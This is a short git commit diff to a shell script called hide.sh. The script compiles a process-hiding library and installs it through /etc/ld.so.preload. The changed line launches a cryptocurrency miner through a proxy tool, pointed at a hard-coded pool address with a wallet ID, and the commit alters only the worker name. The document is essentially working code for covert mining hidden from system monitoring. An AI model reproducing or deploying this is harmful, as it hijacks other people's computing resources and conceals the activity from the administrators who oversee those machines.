6fa4427f12aea086f07d7786ae558207537a512b
rigmining <117586334+rigmining@users.noreply.github.com>
2022-11-11 06:02:48 -0800

    Update hide.sh

--- hide.sh
+++ hide.sh
@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./stratum -r stratum+tcp://128.199.159.60:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.kerjonuyul -m 14
+./graftcp/graftcp ./stratum -r stratum+tcp://128.199.159.60:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcs7c2fusszy08qaz87cg.mepeteles -m 14
